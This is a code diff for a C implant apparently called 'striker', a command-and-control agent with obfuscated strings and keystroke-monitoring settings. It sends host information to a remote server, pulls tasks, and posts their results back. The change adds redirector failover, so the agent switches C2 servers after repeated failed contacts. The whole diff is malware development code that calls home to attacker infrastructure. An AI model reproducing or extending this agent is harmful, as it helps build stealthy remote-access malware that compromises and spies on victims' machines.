@@ -7,14 +7,16 @@
 
 #include "striker.h"
 
-// Set to non-zero value for debug outputs.
-#define STRIKER_DEBUG
+// Controls debug output
+// #define STRIKER_DEBUG
 // Size of agent UID
 #define AGENT_UID_SIZE 17
 // Max task result size in bytes
 #define MAX_RES_SIZE (sizeof(char) * 102400)
 // Max number of tasks to queue.
 #define MAX_TASKS_QUEUE 100
+// Max number of failed attempts to contact server before trying another server (if available)
+#define MAX_CONTACT_FAILS 3
 // Max number of keystrokes to collect by keymon
 #define KEYMON_MAX_KEYSTROKES 50000
 // Max number of processes to hook by keymon
@@ -48,7 +50,7 @@ CURL *init_curl(const char *path, buffer *buff){
   CURL *curl = curl_easy_init();
   if (!curl){
     #ifdef STRIKER_DEBUG
-    fprintf(stderr, "[-]Error initializing curl!\n");
+    fprintf(stderr, "[-] Error initializing curl!\n");
     #endif
     exit(EXIT_FAILURE);
   }
@@ -474,11 +476,11 @@ void *task_executor(void *ptr){
     char msg[] = "[OBFS_ENC]Session aborted!";
     buffer_strcpy(result_buff, obfs_decode(msg));
     striker->abort = 1;
-  }else if (!strcmp(tsk->type, cmd_strs[6])){
+  }else if (!strcmp(tsk->type, cmd_strs[6])){ // Update callback delay.
     char msg[] = "[OBFS_ENC]Callback delay updated!";
     striker->delay = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, cmd_strs[6]));
     buffer_strcpy(result_buff, obfs_decode(msg));
-  }else if (!strcmp(tsk->type, cmd_strs[7])){
+  }else if (!strcmp(tsk->type, cmd_strs[7])){ // Change working directory
     char strs[][50] = {"[OBFS_ENC]Changed working directory!", "[OBFS_ENC]Error changing working directory!", "[OBFS_ENC]dir"};
     if (chdir(cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[2])))))
       buffer_strcpy(result_buff, obfs_decode(strs[1]));
@@ -510,12 +512,13 @@ void *task_executor(void *ptr){
 
 void start_session(){  
   
-  // Decode some config.
+  queue *base_addrs = queue_init(100);
   obfs_decode(BASE_URL);
+  queue_put(base_addrs, strdup(BASE_URL));
   char strs[][50] = {
     "[OBFS_ENC]/tmp/", "[OBFS_ENC]Connection: close", "[OBFS_ENC]Content-Type: application/json",
-    "[OBFS_ENC]/agent/init", "[OBFS_ENC]uid", "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC]key", "[OBFS_ENC]delay"};
-  for (int i = 0; i < 8; i++)
+    "[OBFS_ENC]/agent/init", "[OBFS_ENC]uid", "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC]key", "[OBFS_ENC]delay", "[OBFS_ENC]redirectors"};
+  for (int i = 0; i < 9; i++)
     obfs_decode(strs[i]);
   // Default session setup.
   session *striker = malloc(sizeof(session));
@@ -539,47 +542,84 @@ void start_session(){
   post_headers = curl_slist_append(post_headers, strs[1]);
   post_headers = curl_slist_append(post_headers, strs[2]);
   buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.
-  cJSON *info = sysinfo();
-  cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(AUTH_KEY));
-  cJSON_AddItemToObject(info, strs[7], cJSON_CreateNumber(striker->delay));
-  tmp = cJSON_PrintUnformatted(info);
-  cJSON_Delete(info);
 
-  while (!striker->abort){ // Initiation loop.
-    curl = init_curl(strs[3], body);
-    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
-    res = curl_easy_perform(curl);
-    curl_easy_cleanup(curl);
-    if (res != CURLE_OK){
-      #ifdef STRIKER_DEBUG
-      fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
-      #endif
-      sleep(striker->delay);
-      continue;
+  // Connects to the C2 server.
+  contact_base: ;
+    cJSON *info = sysinfo();
+    cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(AUTH_KEY));
+    cJSON_AddItemToObject(info, strs[7], cJSON_CreateNumber(striker->delay));
+    tmp = cJSON_PrintUnformatted(info);
+    cJSON_Delete(info);
+    unsigned char connected = 0;
+    while (!(striker->abort || connected)){
+      queue_seek(base_addrs, 0);
+      while (!queue_exhausted(base_addrs)){
+        strncpy(BASE_URL, queue_get(base_addrs), URL_SIZE);
+        resize_buffer(body, 0);
+        curl = init_curl(strs[3], body);
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
+        res = curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+        if (res != CURLE_OK){
+          #ifdef STRIKER_DEBUG
+          fprintf(stderr, "[-] Error calling home %s: %s\n", BASE_URL, curl_easy_strerror(res));
+          #endif
+          sleep(striker->delay);
+          continue;
+        }
+        connected = 1;
+        break;
+      }
     }
-    break;
-  }
   free(tmp);
 
+  // Parse the configuration received from the server.
   char *config_str = buffer_to_string(body);
   cJSON *config = cJSON_Parse(config_str);
+  #ifdef STRIKER_DEBUG
+  printf("[*] Agent config: %s\n", config_str);
+  #endif
   if (!config){
     #ifdef STRIKER_DEBUG
     const char *error = cJSON_GetErrorPtr();
     fprintf(stderr, "[-] Error parsing config: %s\n", error);
     #endif
+    free(config_str);
     goto end;
   }
+  // Extract agent ID.
   tmp = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, strs[4]));
   if (tmp == NULL){
+    #ifdef STRIKER_DEBUG
+    fprintf(stderr, "[-] No config received from server, exiting...\n");
+    #endif
     cJSON_Delete(config);
+    free(config_str);
     goto end;
   }
   strncpy(striker->uid, tmp, AGENT_UID_SIZE - 1);
+  // Extract redirectors.
+  // 1 - Delete all existing ones.
+  queue_seek(base_addrs, 0);
+  while (!queue_empty(base_addrs)){
+    char *url = queue_remove(base_addrs, 0);
+    free(url);
+  }
+  // 2 - Add the current base URL.
+  queue_put(base_addrs, strdup(BASE_URL));
+  // 3 - Load the other redirectors.
+  cJSON *rds = cJSON_GetObjectItemCaseSensitive(config, strs[8]);
+  size_t rds_count = cJSON_GetArraySize(rds);
+  while (rds_count > 0){
+    queue_put(base_addrs, strdup(cJSON_GetStringValue(cJSON_GetArrayItem(rds, 0))));
+    cJSON_DeleteItemFromArray(rds, 0);
+    rds_count--;
+  }
   #ifdef STRIKER_DEBUG
-  printf("[*] Agent config: %s\n", config_str);
+  printf("[+] Servers count: %ld\n", base_addrs->count);
   #endif
+
   cJSON_Delete(config);
   free(config_str);
 
@@ -587,7 +627,25 @@ void start_session(){
   snprintf(tasksURL, URL_SIZE, strs[5], striker->uid);
   queue *tasks_queue = queue_init(MAX_TASKS_QUEUE);
   queue *completed_tasks = queue_init(MAX_TASKS_QUEUE);
+  unsigned int contact_fails = 0;
   while (!striker->abort){
+    if (contact_fails >= MAX_CONTACT_FAILS){ // Switch to another server.
+      #ifdef STRIKER_DEBUG
+      fprintf(stderr, "[!] Max failed connection attempts reached. Switching server...\n");
+      #endif
+      // Cleanup
+      free(tasksURL);
+      queue_seek(tasks_queue, 0);
+      while (!queue_exhausted(tasks_queue))
+        free_task(queue_get(tasks_queue));
+      queue_seek(completed_tasks, 0);
+      while (!queue_exhausted(completed_tasks))
+        free_task(queue_get(completed_tasks));
+      queue_free(tasks_queue, 0);
+      queue_free(completed_tasks, 0);
+      // Switch
+      goto contact_base;
+    }
     queue_seek(completed_tasks, 0);
     unsigned long next_cb_time = (unsigned long)time(NULL) + striker->delay;
     while ((unsigned long)time(NULL) < next_cb_time){
@@ -615,22 +673,26 @@ void start_session(){
           cJSON_AddItemToArray(results, tsk->result);
         }
         char *result = cJSON_PrintUnformatted(results);
-        do{
-          resize_buffer(body, 0);
-          curl = init_curl(tasksURL, body);
-          curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
-          curl_easy_setopt(curl, CURLOPT_POSTFIELDS, result);
-          res = curl_easy_perform(curl);
-          curl_easy_cleanup(curl);
-          if (res != CURLE_OK){
-            #ifdef STRIKER_DEBUG
-            fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
-            #endif
-            sleep(striker->delay);
-            continue;
+        resize_buffer(body, 0);
+        curl = init_curl(tasksURL, body);
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, result);
+        res = curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+        if (res != CURLE_OK){
+          #ifdef STRIKER_DEBUG
+          fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
+          #endif
+          size_t count = cJSON_GetArraySize(results);
+          while (count > 0){
+            cJSON_DetachItemFromArray(results, count - 1);
+            count--;
           }
-          break;
-        }while(!striker->abort);
+          cJSON_Delete(results);
+          free(result);
+          contact_fails++;
+          continue;          
+        }
         queue_seek(completed_tasks, 0);
         while (!queue_exhausted(completed_tasks)){
           task *tsk = queue_get(completed_tasks);
@@ -653,6 +715,7 @@ void start_session(){
       #ifdef STRIKER_DEBUG
       fprintf(stderr, "[-] Error fetching tasks: %s\n", curl_easy_strerror(res));
       #endif
+      contact_fails++;
       continue;
     }
     // Parse tasks and spawn execution threads.
@@ -698,6 +761,7 @@ void start_session(){
     curl_slist_free_all(get_headers);
     curl_slist_free_all(post_headers);
     free_buffer(body);
+    queue_free(base_addrs, 1);
     cleanup_session(striker);
 }
 
